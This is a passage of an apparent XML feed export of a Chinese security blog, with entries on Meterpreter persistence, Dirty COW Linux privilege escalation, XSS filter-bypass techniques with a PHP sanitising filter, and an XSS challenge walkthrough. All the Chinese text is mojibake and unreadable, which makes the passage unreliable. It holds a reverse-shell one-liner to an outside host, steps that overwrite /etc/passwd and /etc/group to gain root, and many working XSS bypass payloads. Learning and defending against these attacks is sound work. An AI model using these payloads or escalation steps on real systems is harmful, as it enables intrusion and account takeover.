æ³•å†è·å¾—åå¼¹çš„ä¼šè¯ï¼Œé‚£ä¹ˆæƒ³è¦è¿›è¡Œä¸€ä¸ªæŒç»­çš„æ§åˆ¶å°±éœ€è¦åœ¨ç¬¬ä¸€æ¬¡è·å¾—ä¼šè¯æ—¶åŠ¨ä¸€äº›æ‰‹è„šrun persistence -U -i 5 â€“r ip port-U ç”¨æˆ·ç™»å½•æ—¶åå¼¹ä¼šè¯ ä¹Ÿå¯ä»¥ä½¿ç”¨-Xå½“ç³»ç»Ÿå¯åŠ¨æ—¶åå¼¹ä¼šè¯-i æ—¶é—´]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>msfvenom</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Dirty COWçš„é‚£äº›äº‹]]></title>
    <url>%2F2017%2F08%2F28%2F15%2F</url>
    <content type="text"><![CDATA[æœ¬æ–‡åˆæ˜¯ä¸€æ¬¡ç¬”è®°å›é¡¾ï¼Œå°†docçš„ç¬”è®°ç”¨markdownå†™ä¸€éï¼Œå›é¡¾ä¸€ä¸‹23333333 ç®€ä»‹æ¼æ´ç¼–å·ï¼šCVE-2016-5195 æ¼æ´åç§°ï¼šè„ç‰›ï¼ˆDirty COWï¼‰ æ¼æ´å±å®³ï¼šä½æƒé™ç”¨æˆ·åˆ©ç”¨è¯¥æ¼æ´æŠ€æœ¯å¯ä»¥åœ¨å…¨ç‰ˆæœ¬ Linux ç³»ç»Ÿä¸Šå®ç°æœ¬åœ°ææƒ å½±å“èŒƒå›´ï¼šLinux å†…æ ¸2.6.22 &lt; 3.9 (x86/x64) åŸç†:Linux å†…æ ¸çš„å†…å­˜å­ç³»ç»Ÿåœ¨å¤„ç†å†™å…¥æ—¶å¤åˆ¶ï¼ˆcopy-on-write, COWï¼‰æ—¶äº§ç”Ÿäº†ç«äº‰æ¡ä»¶ï¼ˆraceconditionï¼‰ã€‚æ¶æ„ç”¨æˆ·å¯åˆ©ç”¨æ­¤æ¼æ´ï¼Œæ¥è·å–é«˜æƒé™ï¼Œå¯¹åªè¯»å†…å­˜æ˜ å°„è¿›è¡Œå†™è®¿é—®ã€‚ï¼ˆA race condition was found in the way the Linux kernelâ€™s memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings.ï¼‰ ç«äº‰æ¡ä»¶ï¼ŒæŒ‡çš„æ˜¯ä»»åŠ¡æ‰§è¡Œé¡ºåºå¼‚å¸¸ï¼Œå¯å¯¼è‡´åº”ç”¨å´©æºƒï¼Œæˆ–ä»¤æ”»å‡»è€…æœ‰æœºå¯ä¹˜ï¼Œè¿›ä¸€æ­¥æ‰§è¡Œå…¶ä»–ä»£ç ã€‚åˆ©ç”¨è¿™ä¸€æ¼æ´ï¼Œæ”»å‡»è€…å¯åœ¨å…¶ç›®æ ‡ç³»ç»Ÿæå‡æƒé™ï¼Œå¯ä»¥è·å¾— root æƒé™ã€‚***åˆ©ç”¨ï¼šexp å¤ç°ä¸æ€»ç»“åœ¨æœ¬åœ°éƒ¨ç½²ä¸€ä¸ªæ¼æ´ç¯å¢ƒï¼Œä½¿ç”¨webæœåŠ¡å™¨ä¸Šçš„å¤§é©¬åå¼¹ shellååˆ©ç”¨dirty cow è¿›è¡Œææƒ åå¼¹shellï¼š12nc -l -p 22222 -vv bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 æŸ¥çœ‹ç‰ˆæœ¬ï¼šcat /proc/versionã€uname -aã€lsb release -aå‡å¯ ç¼–è¯‘ï¼šgcc -pthread exp.c -o exp -lcrypt æ‰§è¡Œ./exp å³å¯ä¸ºç”¨æˆ·firefart è®¾ç½®å¯†ç  ç„¶åå³å¯ç”¨æ·»åŠ çš„ç”¨æˆ·è¿æ¥ä¸»æœº é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ç”¨ä¸‹é¢ä¸€äº›æ–¹å¼è¿›è¡Œææƒï¼ˆå­¦ä¹ è‡ªäº’è”ç½‘ï¼‰1)åœ¨/tmp/.pwnå†™å…¥ 123#!/bin/bashecho MOOOOOOOOOOO/bin/bash chmod+x/tmp/.pwnç„¶åä¿®æ”¹/etc/passwdä¸­çš„shellæŒ‡å‘./dirtyc0w /etc/passwd root:x:0:0:root:/root:/tmp/.pwn 2)æ·»åŠ ç”¨æˆ·åˆ°sudoç»„ ./dirtyc0w /etc/group &quot;$(sed&#39;s/\(sudo:x:.*:\)/\1test1/g&#39;/etc/group)&quot; ä¸‹æ¬¡ç®¡ç†å‘˜å†ç™»é™†çš„è¯ sudo suä¸éœ€è¦å¯†ç  3)å°†/etc/passwdä¸­çš„uidä½æ”¹ä¸º0 4)æ³¨å…¥shellcodeåˆ°suidæ–‡ä»¶ï¼Œæ¯”å¦‚æœ€å¸¸è§çš„2ä¸ªæ–‡ä»¶/usr/bin/crontab/usr/bin/passwd ä¿®å¤æ–¹æ¡ˆï¼š Centos/RHELæ›´æ–° sudo yum update Ubuntu/Debianæ›´æ–° sudo apt-get update &amp;&amp; sudo apt-get dist-upgrade æ›´æ–°åˆ°æœ€æ–°çš„å†…æ ¸ç‰ˆæœ¬å³å¯ã€‚éœ€è¦é‡å¯æ‰èƒ½ç”Ÿæ•ˆ]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>Linuxææƒ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æˆ‘ä¸XSSçš„æ„Ÿæƒ…ä¹‹è·¯(3)]]></title>
    <url>%2F2017%2F08%2F28%2F14%2F</url>
    <content type="text"><![CDATA[å¿ƒå¾—æ¥ç€ä¸Šä¸€æ–‡è¿‡æ¥ï¼Œè¿™ä¸€éƒ¨åˆ†æ˜¯ä¸ªäººçš„ä¸€äº›æ€»ç»“ã€‚å¯¹äºæŒ–æ˜xssæ¼æ´ï¼Œç›®çš„éƒ½æ˜¯è®©è‡ªå·±çš„payloadå¯ä»¥æ‰§è¡Œï¼Œåœ¨å…¶æ¢ç´¢çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä¸ªäººé¦–å…ˆä¼šé€šè¿‡å®¡æŸ¥å…ƒç´ ï¼Œäº†è§£å…¶è¾“å…¥ç‚¹ï¼Œè¿‡æ»¤è§„åˆ™ï¼Œç„¶åå†é’ˆå¯¹æ€§çš„è¿›è¡Œpayloadçš„æ„é€ ã€‚é¦–å…ˆï¼Œè¾“å…¥æ¡†ã€flashã€cssã€ä¸Šä¼ ç‚¹ã€httpå¤´éƒ¨çš„å­—æ®µã€ç¬¬ä¸‰æ–¹æ’ä»¶ã€èƒ½ä¸»åŠ¨ä¿®æ”¹å…¶å‚æ•°å€¼çš„ä»»æ„å‚æ•°ç­‰ç­‰ï¼Œå­˜åœ¨è¾“å…¥çš„åœ°æ–¹éƒ½æœ‰å¯èƒ½å­˜åœ¨xssã€‚æ˜ç¡®å¥½ç›®æ ‡åï¼Œæˆ‘ä¹ æƒ¯å…ˆè¾“å…¥ä¸€å †æµ‹è¯•å­—ç¬¦çœ‹çœ‹å…¶è¿‡æ»¤è§„åˆ™ï¼š&#39;&#39;;!--&quot;&lt;XSS&gt;=&amp;{()}/&#39;scriptã€onã€alertã€promptã€confirmã€&lt;script src=&quot;http://x.js&quot;&gt; %c0u003cimg+src%3d1+onerror%3dalert(/xss/)+%c0u003eâ€¦â€¦ä¸€èˆ¬éƒ½èƒ½åˆ¤æ–­å‡ºå¦‚ä½•è¿‡æ»¤çš„ï¼Œå°±åƒä¹‹å‰åšé¢˜çš„è¿‡ç¨‹ä¸­ï¼Œéƒ½æ˜¯ç»è¿‡æµ‹è¯•æ‰æœ‰ç»“æœï¼Œæ‰èƒ½å¯¹ç—‡ä¸‹è¯ã€‚ ç„¶åå¯¹äºè¿‡æ»¤è§„åˆ™ï¼Œæˆ‘æ€»ç»“äº†è¿™æ ·å‡ ç‚¹ï¼š 1ã€å¤§å°å†™ï¼š&lt;ScRIpT&gt;alert(&#39;123&#39;)&lt;/sCRIpT&gt; 2ã€ç¼–ç ç»•è¿‡ï¼š12345678.åå…­è¿›åˆ¶ç¼–ç .jsfuckç¼–ç .urlç¼–ç .unicodeç¼–ç .åŠ è§£å¯†.HTMLç¼–ç .hexç¼–ç .ASCIIç¼–ç  3ã€ç»•è¿‡magic_quotes_gpcï¼š&lt;script&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)&lt;/script&gt; 4ã€é—­åˆæ ‡ç­¾&quot;&gt;&lt;script&gt;alert(/123/)&lt;/script&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt; 5ã€æ ‡ç­¾ç»•è¿‡12345&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;&lt;button onclick=&quot;javascript:alert(&apos;xss&apos;)&gt;XSS&lt;/button&quot;&gt;&lt;title&gt;&lt;img a=&quot;&lt;/title&gt;&lt;img/src=1 onerror=alert(1)//&quot;&gt;&quot;onsubmit=javascript:alert(1)%20name=&quot;a&lt;svg/onload=prompt(1)&gt;ç­‰ç­‰ 6ã€å…¶ä»–ç¬¦å·ç»•è¿‡ %0a alert(1); %0a æ¢è¡Œç¬¦ %0d /**/ æ›¿æ¢ç©ºæ ¼ %00 |æˆªæ–­ å¦å¤–åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå½“â€è¢«è¿‡æ»¤ï¼Œå¯ä»¥åœ¨IEå†…æ ¸ä¸‹ä½¿ç”¨ä¸¤ä¸ªåå¼•å·(`)TABé”®ä¸Šé¢çš„é‚£ä¸ªä»£æ›¿åŒå¼•å·. 7ã€åŒå­—æ¯ç»•è¿‡ &lt;img ononerrorerror=&quot;123&quot;&gt;ã€&lt;script&gt;alalertert(123)&lt;/script&gt;8ã€å®½å­—èŠ‚ç»•è¿‡gbxxxxç³»åˆ—çš„ç¼–ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°è¯•ä¸€ä¸‹å®½å­—èŠ‚ %c0 %bf %5c 9ã€å…¶ä»–äº‹ä»¶ç»•è¿‡ï¼ˆæ¯”å¦‚è¿‡æ»¤äº†&lt;&gt;ä½¿ç”¨ &quot;onmouseover=alert(11) bad=ï¼‰123456 onload onclick onerror prompt confirm onmousemove é™„å½•1ï¼š type Horizontal Tab New line Carriage Return URL %09 %10 %13 ç©ºå­—ç¬¦ (%00) ä½¿å¾—è¿‡æ»¤å™¨ä¸èƒ½çœ‹åˆ°å®Œæ•´çš„ &lt;script&gt;æ ‡ç­¾. åªåœ¨ IE 6.0, IE 7.0 å¯ä»¥ã€‚ é™„å½•2ï¼š blank %20 / %2F â€”â€” â€”â€” ? %3F â€”â€” â€”â€” + %2B é˜²å¾¡ï¼šå¯¹äºé‡‡ç”¨è¿‡æ»¤ã€è½¬ä¹‰æ¥é˜²å¾¡xssæ¼æ´æœ€åŸºæœ¬çš„æ–¹å¼ï¼Œå…·ä½“å®ç°ï¼Œå¿…é¡»åŸºäºä»£ç ï¼Œè€Œå¯¹åº”çš„é˜²å¾¡æ‹›å¼å·²ç»è®¸å¤šå‰è¾ˆä»¬éƒ½æœ‰åˆ†äº«ã€‚æˆ‘è§‰å¾—åšå¥½ç¼–ç ã€è¿‡æ»¤çš„å·¥ä½œä¹‹åï¼Œä¸‹é¢ä¸¤ä¸ªæªæ–½ä¹Ÿæ˜¯æœ‰å¿…è¦å®æ–½çš„ã€‚1ï¼šä¸ºCookieåŠ ä¸ŠHttpOnlyæ ‡è®°ã€‚ä¿æŠ¤å¥½cookieï¼Œå°±ç®—å„ç§è¿‡æ»¤éƒ½è¢«ç»•è¿‡ï¼Œä¹Ÿæ— æ³•è¯»å–ã€ä¿®æ”¹cookieï¼Œèƒ½æœ‰æ•ˆçš„å‡è½»å±å®³ã€‚2ï¼šéƒ¨ç½²wafæ˜¯ä¸€ä»¶å¾ˆæœ‰æ•ˆçš„å·¥ä½œã€‚ä¸€ä¸ªå…·æœ‰ä¸°å¯Œè§„åˆ™åº“çš„wafèƒ½å¤§å¹…åº¦è¿‡æ»¤æ‰æ¶æ„è¾“å…¥æ•°æ®ï¼Œä¸ªäººæ„Ÿè§‰ä¸»è¦æ˜¯èƒ½å¢åŠ çªç ´é˜²å¾¡çš„éš¾åº¦ï¼Œä¸ä»…ä»…é’ˆå¯¹äºxssæ¼æ´ï¼Œå…¶ä»–çš„æ¼æ´ä¹Ÿæ˜¯ä¸€æ ·ã€‚èƒ½æœ‰æ•ˆé™ä½å…¶é£é™©ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªphpçš„xssè¿‡æ»¤å™¨ï¼š(å­¦ä¹ äºç½‘ä¸Šï¼Œå°†è¯¥ä»£ç åŠ å…¥åˆ°æ ¸å¿ƒå‡½æ•°åº“ï¼Œç„¶åå†è°ƒç”¨å³å¯) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?php function RemoveXSS($val) &#123; // remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed // this prevents some character re-spacing such as &lt;java\0script&gt; // note that you have to handle splits with \n, \r, and \t later since they *are* allowed in some inputs $val = preg_replace(&apos;/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/&apos;, &apos;&apos;, $val); // straight replacements, the user should never need these since they&apos;re normal characters // this prevents like &lt;IMG SRC=@avascript:alert(&apos;XSS&apos;)&gt; $search = &apos;abcdefghijklmnopqrstuvwxyz&apos;; $search .= &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;; $search .= &apos;1234567890!@#$%^&amp;*()&apos;; $search .= &apos;~`&quot;;:?+/=&#123;&#125;[]-_|\&apos;\\&apos;; for ($i = 0; $i &lt; strlen($search); $i++) &#123; // ;? matches the ;, which is optional // 0&#123;0,7&#125; matches any padded zeros, which are optional and go up to 8 chars // @ @ search for the hex values $val = preg_replace(&apos;/(&amp;#[xX]0&#123;0,8&#125;&apos;.dechex(ord($search[$i])).&apos;;?)/i&apos;, $search[$i], $val); // with a ; // @ @ 0&#123;0,7&#125; matches &apos;0&apos; zero to seven times $val = preg_replace(&apos;/(&amp;#0&#123;0,8&#125;&apos;.ord($search[$i]).&apos;;?)/&apos;, $search[$i], $val); // with a ; &#125; // now the only remaining whitespace attacks are \t, \n, and \r $ra1 = Array(&apos;javascript&apos;, &apos;vbscript&apos;, &apos;expression&apos;, &apos;applet&apos;, &apos;meta&apos;, &apos;xml&apos;, &apos;blink&apos;, &apos;link&apos;, &apos;style&apos;, &apos;script&apos;, &apos;embed&apos;, &apos;object&apos;, &apos;iframe&apos;, &apos;frame&apos;, &apos;frameset&apos;, &apos;ilayer&apos;, &apos;layer&apos;, &apos;bgsound&apos;, &apos;title&apos;, &apos;base&apos;); $ra2 = Array(&apos;onabort&apos;, &apos;onactivate&apos;, &apos;onafterprint&apos;, &apos;onafterupdate&apos;, &apos;onbeforeactivate&apos;, &apos;onbeforecopy&apos;, &apos;onbeforecut&apos;, &apos;onbeforedeactivate&apos;, &apos;onbeforeeditfocus&apos;, &apos;onbeforepaste&apos;, &apos;onbeforeprint&apos;, &apos;onbeforeunload&apos;, &apos;onbeforeupdate&apos;, &apos;onblur&apos;, &apos;onbounce&apos;, &apos;oncellchange&apos;, &apos;onchange&apos;, &apos;onclick&apos;, &apos;oncontextmenu&apos;, &apos;oncontrolselect&apos;, &apos;oncopy&apos;, &apos;oncut&apos;, &apos;ondataavailable&apos;, &apos;ondatasetchanged&apos;, &apos;ondatasetcomplete&apos;, &apos;ondblclick&apos;, &apos;ondeactivate&apos;, &apos;ondrag&apos;, &apos;ondragend&apos;, &apos;ondragenter&apos;, &apos;ondragleave&apos;, &apos;ondragover&apos;, &apos;ondragstart&apos;, &apos;ondrop&apos;, &apos;onerror&apos;, &apos;onerrorupdate&apos;, &apos;onfilterchange&apos;, &apos;onfinish&apos;, &apos;onfocus&apos;, &apos;onfocusin&apos;, &apos;onfocusout&apos;, &apos;onhelp&apos;, &apos;onkeydown&apos;, &apos;onkeypress&apos;, &apos;onkeyup&apos;, &apos;onlayoutcomplete&apos;, &apos;onload&apos;, &apos;onlosecapture&apos;, &apos;onmousedown&apos;, &apos;onmouseenter&apos;, &apos;onmouseleave&apos;, &apos;onmousemove&apos;, &apos;onmouseout&apos;, &apos;onmouseover&apos;, &apos;onmouseup&apos;, &apos;onmousewheel&apos;, &apos;onmove&apos;, &apos;onmoveend&apos;, &apos;onmovestart&apos;, &apos;onpaste&apos;, &apos;onpropertychange&apos;, &apos;onreadystatechange&apos;, &apos;onreset&apos;, &apos;onresize&apos;, &apos;onresizeend&apos;, &apos;onresizestart&apos;, &apos;onrowenter&apos;, &apos;onrowexit&apos;, &apos;onrowsdelete&apos;, &apos;onrowsinserted&apos;, &apos;onscroll&apos;, &apos;onselect&apos;, &apos;onselectionchange&apos;, &apos;onselectstart&apos;, &apos;onstart&apos;, &apos;onstop&apos;, &apos;onsubmit&apos;, &apos;onunload&apos;); $ra = array_merge($ra1, $ra2); $found = true; // keep replacing as long as the previous round replaced something while ($found == true) &#123; $val_before = $val; for ($i = 0; $i &lt; sizeof($ra); $i++) &#123; $pattern = &apos;/&apos;; for ($j = 0; $j &lt; strlen($ra[$i]); $j++) &#123; if ($j &gt; 0) &#123; $pattern .= &apos;(&apos;; $pattern .= &apos;(&amp;#[xX]0&#123;0,8&#125;([9ab]);)&apos;; $pattern .= &apos;|&apos;; $pattern .= &apos;|(&amp;#0&#123;0,8&#125;([9|10|13]);)&apos;; $pattern .= &apos;)*&apos;; &#125; $pattern .= $ra[$i][$j]; &#125; $pattern .= &apos;/i&apos;; $replacement = substr($ra[$i], 0, 2).&apos;&lt;x&gt;&apos;.substr($ra[$i], 2); // add in &lt;&gt; to nerf the tag $val = preg_replace($pattern, $replacement, $val); // filter out the hex tags if ($val_before == $val) &#123; // no replacements were made, so exit the loop $found = false; &#125; &#125; &#125; return $val; &#125; ?&gt; å‚è€ƒé“¾æ¥ï¼šhttp://www.freebuf.com/sectool/108568.htmlhttps://www.secpulse.com/archives/44299.htmlhttps://www.waitalone.cn/the-seven-principles-of-xss-defense.html]]></content>
      <categories>
        <category>WEBå®‰å…¨</category>
      </categories>
      <tags>
        <tag>bypass</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æˆ‘ä¸XSSçš„æ„Ÿæƒ…ä¹‹è·¯(2)]]></title>
    <url>%2F2017%2F07%2F23%2F13%2F</url>
    <content type="text"><![CDATA[æ¥ç€ä¸Šä¸€æ–‡è¿‡æ¥ï¼Œè¿™ä¸€éƒ¨åˆ†æ˜¯ç¬¬äºŒä¸ªç¯å¢ƒçš„åšé¢˜è®°å½•ã€‚ å¹³å°2 xsqler.winStage#1: http://sqler.win/xss/level1.php?name=testæœ¬å…³ç®€å•ï¼Œä½¿ç”¨svg\body\style \ iframeç­‰æ ‡ç­¾å‡å¯è¿‡å…³ã€‚payload: http://sqler.win/xss/level1.php?name=test&lt;body/onload=alert(1)&gt; Stage#2: http://sqler.win/xss/level2.php?keyword=testæœ¬é¢˜ä¸ç¬¬ä¸€é¢˜å·®ä¸å¤šï¼Œåªéœ€è¦è¿›è¡Œæ ‡ç­¾çš„é—­åˆå³å¯ã€‚payload:http://sqler.win/xss/level2.php?keyword=test&quot;&gt;&lt;body/onload=alert(1)&gt; Stage#3ï¼šhttp://sqler.win/xss/level3.php?writing=waitæœ¬é¢˜é€šè¿‡æµ‹è¯•ï¼Œå¯å¾—çŸ¥è¿‡æ»¤äº†&lt;&gt;ï¼Œä¸”åªèƒ½ç”¨â€™é—­åˆæ ‡ç­¾ã€‚äºæ˜¯é‡‡ç”¨onäº‹ä»¶å‹å¦‚onmouseoverã€onmouseoutã€onclickç­‰è¿›è¡Œç»•è¿‡ã€‚Payload: &#39;onmouseover=&#39;alert(1) Stage#4: http://sqler.win/xss/level4.php?keyword=æœ¬é¢˜ä¸ä¸Šé¢˜ç±»ä¼¼ï¼Œä½¿ç”¨â€é—­åˆæ ‡ç­¾å³å¯ï¼špayloadï¼š&quot;onmouseover=&#39;alert(1)â€™ Stage#5: http://sqler.win/xss/level5.php?keyword=find a way out! æœ¬é¢˜æ¯”è¾ƒç®€å•ï¼Œå¢åŠ äº†è¿‡æ»¤èŒƒå›´ï¼Œon-&gt;o_n ç„¶åéœ€è¦é—­åˆã€‚å¯ä»¥ä½¿ç”¨&quot;&gt;&lt;a href=javascript:alert(1)&gt;é€šè¿‡ç‚¹å‡»å‡ºç°çš„é“¾æ¥è¿›è¡Œé€šå…³ã€‚ Stage#6: http://sqler.win/xss/level6.php?keyword=break it out! éšä¾¿å“ªä¸€ä¸ªè¯•ä¸€ä¸‹ï¼Œå¤„ç†æ‰äº†srcã€herfã€onxxxã€ç­‰ï¼Œéœ€è¦è¿›è¡Œç»•è¿‡ï¼Œé€šè¿‡å¤§å°å†™ï¼ŒæˆåŠŸç»•è¿‡payloadï¼š&quot;&gt;&lt;a HRef=javascript:alert(1)&gt; Stage#7: http://sqler.win/xss/level7.php?keyword=move up! æœ¬é¢˜å¯¹è¾“å…¥çš„scriptã€onç­‰è¿›è¡Œäº†å•å±‚è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨å…¶è¿‡æ»¤ä¸ä¸¥ï¼Œé‡‡ç”¨æ­¤ç±»payloadç»•è¿‡å³å¯ï¼š&lt;svg/oonnload=alert(1)&gt;ã€æˆ–è€…å°†scriptå†™æˆscrscriptiptçš„æ–¹å¼æ„é€ å³å¯ã€‚ Stage#8:http://sqler.win/xss/level7.php?keyword=move up! æœ¬é¢˜å·²ç»ç»™å‡ºäº†ä¸€ä¸ªæ ‡ç­¾,ä½†æ˜¯è¿‡æ»¤äº†scriptã€srcç­‰ï¼Œå¤§å°å†™æ— æ³•ç»•è¿‡ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨htmlç¼–ç è¿›è¡Œç»•è¿‡payloadï¼šjavasc&amp;#114;ipt:alert(1) Stage#9ï¼šhttp://sqler.win/xss/level9.php?keyword=not bad! æœ¬é¢˜æœ€å¤§çš„éš¾ç‚¹åœ¨äºç»•åˆæ³•è¿æ¥ï¼Œå‘ç°åªæœ‰å¸¦http://çš„urlæ‰èƒ½è¢«è®¤ä¸ºæ˜¯åˆæ³•é“¾æ¥ï¼Œå¦å¤–ç”±äºâ€œâ€ä¹Ÿè¢«è¿‡æ»¤ï¼Œå…¶ä»–è§„åˆ™ä¸ä¸Šä¸€å…³ç›¸åŒï¼Œå› æ­¤éœ€è¦è¿›è¡Œç¼–ç ã€‚äºæ˜¯æ„é€ payloadï¼š javascr&amp;#105pt:alert(&amp;#34;http://x&amp;#34;) Stage#10ï¼šhttp://sqler.win/xss/level10.php?keyword=well done! æœ¬é¢˜å­˜åœ¨ä¸‰ä¸ªéšè—è¾“å…¥æ¡†ï¼Œæ„é€ å¦‚ä¸‹getè¯·æ±‚ï¼ŒæŸ¥çœ‹å…ƒç´ åï¼Œå‘ç°t_sortèƒ½è¢«å†™å…¥ï¼Œå¦‚å›¾ï¼šgetè¯·æ±‚ï¼šhttp://sqler.win/xss/level10.php?t_link=111&amp;t_history=222&amp;t_sort=333 å› æ­¤åªéœ€è¦åœ¨è¯¥å‚æ•°å¤„æ„é€ è·¨ç«™è„šæœ¬è¯­å¥å³å¯ï¼Œä½¿ç”¨&quot;onmouseover=&#39;alert(1)&#39;ç„¶åè®©è¾“å…¥æ¡†å±æ€§æ˜¾ç¤ºå‡ºæ¥æ”¹hiddenä¸ºtextå³å¯ï¼špayloadå¦‚ä¸‹ï¼šhttp://sqler.win/xss/level10.php?t_sort=&quot;onmouseover=&#39;alert(1)&#39; type=&#39;text&#39; Stage#11ï¼šhttp://sqler.win/xss/level11.php?keyword=good job! é€šè¿‡æŸ¥çœ‹å…ƒç´ ï¼Œå‘ç°t_refçš„valueæ˜¯æˆ‘ä»¬è¿™ä¸ªç½‘é¡µçš„refererå€¼ï¼ŒæŠ“åŒ…ä¿®æ”¹refererè¾“å…¥xss payloadï¼š&quot;onmouseover=&#39;alert(1)&#39; type=&#39;text&#39;å³å¯ï¼Œæœ¬é¢˜ä¸æƒ³å¤šè¯´ä»€ä¹ˆï¼Œæ„Ÿè§‰refererä¸€èˆ¬å­˜åœ¨xssçš„æå°‘ã€‚ Stage#12ï¼šhttp://sqler.win/xss/level12.php?keyword=good job! æŸ¥çœ‹å…ƒç´ å¯çœ‹åˆ°t_uaå‚æ•°çš„valueæ˜¯User-Agentå€¼ï¼Œå’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼Œä¿®æ”¹ä¸ºxss payloadå³å¯ï¼š&quot;onmouseover=&#39;alert(1)&#39; type=&#39;text&#39; Stage#13ï¼šhttp://sqler.win/xss/level13.php?keyword=good job! æ­¤é¢˜æ€è·¯åŒä¸Šï¼Œè¿™æ¬¡ä¼ å‚ä½ç½®ä¸ºcookieï¼Œpayloadï¼š&quot;onmouseover=&#39;alert(1)&#39; type=&#39;text&#39;ï¼›æ„Ÿè§‰è¿™ä¸‰é¢˜æ˜¯ç»•è„‘æ´çš„æ ·å­ï¼Œï¼Œï¼Œä½†æ˜¯åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­è¿˜çœŸæ²¡å‘ç°è¿‡ï¼Œï¼Œï¼Œï¼Œ Stage#14ï¼šhttp://sqler.win/xss/level14.phpæœ¬é¢˜å¯ä»¥åœ¨æŸ¥çœ‹å…ƒç´ å‘ç°åµŒå…¥äº†ä¸€ä¸ªiframeé¡µé¢ï¼Œè®¿é—®è¯¥é¡µé¢æ˜¯æŸ¥çœ‹å›¾ç‰‡EXIFä¿¡æ¯çš„ï¼Œé€šè¿‡çœ‹ç­”æ¡ˆçŸ¥é“æœ‰EXIFåœ¨è§£æè¿‡ç¨‹ä¸­ï¼ŒæŸäº›æ’ä»¶åœ¨è§£ææ—¶è¾“å‡ºæœªå¤„ç†å¯å¯¼è‡´xssæ¼æ´ï¼Œå› æ­¤é£Ÿç”¨exiftoolå·¥å…·ï¼Œä¿®æ”¹å›¾ç‰‡EXIFåï¼Œè¿›è¡Œä¸Šä¼ ï¼Œç„¶åè§£æè¿‡ç¨‹ä¸­å¼¹çª—ã€‚å­¦ä¹ äº†ï¼Œï¼Œï¼Œï¼Œ Stage#15ï¼šhttp://sqler.win/xsschallenge/level15.php?src=1.jpgæœ¬å…³è¯´æ˜¯åˆ©ç”¨srcå¯åŒ…å«å‰é¢é¡µé¢ä¸Šçš„xssæ¼æ´ï¼Œç„¶åè¿›è¡Œå¼¹çª—ï¼Œæ€ä¹ˆå°è¯•éƒ½æ²¡å¼¹å‡ºæ¥ï¼Œï¼Œï¼Œè¡¨ç¤ºæ— å¥ˆã€‚ã€‚ã€‚ã€‚ã€‚ Stage#16ï¼šhttp://sqler.win/xss/level16.php?keyword=æœ¬é¢˜ç»ˆäºå›åˆ°å¸¸è§„ç»•çš„æ€è·¯ä¸Šäº†ï¼Œï¼Œç»è¿‡å°è¯•ï¼Œå¯ä»¥åˆ¤æ–­è¿‡æ»¤äº†ç©ºæ ¼ï¼Œ/ç­‰ç¬¦å·ï¼Œç„¶åå°è¯•ç»•è¿‡ï¼Œå¾ˆå¤šå§¿åŠ¿éƒ½ä¸è¡Œï¼ŒåŒ…æ‹¬ç¼–ç ï¼Œè¿›åˆ¶ï¼Œæˆªæ–­ç­‰ç„¶åå‘ç°æ¢è¡Œç¬¦å¯ä»¥ç»•è¿‡ï¼š%0aã€%0dï¼Œå› æ­¤ï¼Œpayloadï¼šhttp://sqler.win/xss/level16.php?keyword=&lt;svg%0aonload=alert(1)&gt; Stage#17ï¼šhttp://sqler.win/xss/level17.php?arg01=a&amp;arg02=bæœ¬é¢˜æ¯”è¾ƒç®€å•ï¼Œåœ¨arg02å‚æ•°å€¼ä¸­å†™å…¥äº‹ä»¶å‹payloadå³å¯è§¦å‘ï¼Œpayload:http://sqler.win/xss/level17.php? arg02=%20onmousedown=alert(1) Stage#18ï¼šttp://sqler.win/xss/level18.php?arg01=a&amp;arg02=bæœ¬é¢˜ä¸ä¸Šä¸€é¢˜ç›¸ä¼¼ï¼Œä½†æ˜¯arg02æ— æ³•æ„é€ å‡ºç©ºæ ¼ï¼Œä¹Ÿå°±æ²¡åŠæ³•å†™å…¥è¾“å‡ºè¯­å¥ï¼Œç„¶åè¯•äº†è¯•arg01ï¼Œæœç„¶æ¢æ±¤ä¸æ¢è¯ï¼Œç›´æ¥å†™å…¥payloadï¼š%20onmousedown=alert(1) Stage#19ï¼šhttp://sqler.win/xss/level19.php?arg01=a&amp;arrg02=bå³é”®æŸ¥çœ‹å…ƒç´ å¯ä»¥çœ‹åˆ°ä¸€ä¸ªswfæ–‡ä»¶è¢«è°ƒç”¨ï¼Œç„¶åè®¾æƒ³ä¸ºflash xssï¼Œé€šè¿‡ä¸‹è½½è¯¥æ–‡ä»¶ï¼Œä½¿ç”¨JPEXSè¿›è¡Œåˆ†æï¼Œå‘ç°ä¸ºactionscript 2.0ï¼Œç„¶åçŸ¥é“actionscript 2.0æ˜¯æœ‰å¯ä»¥ä½¿ç”¨getURLæ¥æ‰§è¡Œjavascriptä¸‹é¢ä»¥ä¸€ä¸ªå®ä¾‹æ¥å‰–æFlash XSSè¿‡ç¨‹ã€‚æœ‰ç‚¹æ‹—å£ï¼Œï¼Œ,ç„¶åå¯¹åº”æœ¬é¢˜ï¼Œå®šä½geturlå‡½æ•°ï¼š å¯ä»¥çœ‹åˆ°åœ¨sIFRçš„å†…å®¹ä¸­å½“getURLæ‰“å¼€æ—¶ï¼Œversionæ˜¯å¯ä»¥ä¼ å…¥åˆ°loc4ä¸­çš„ï¼Œå› 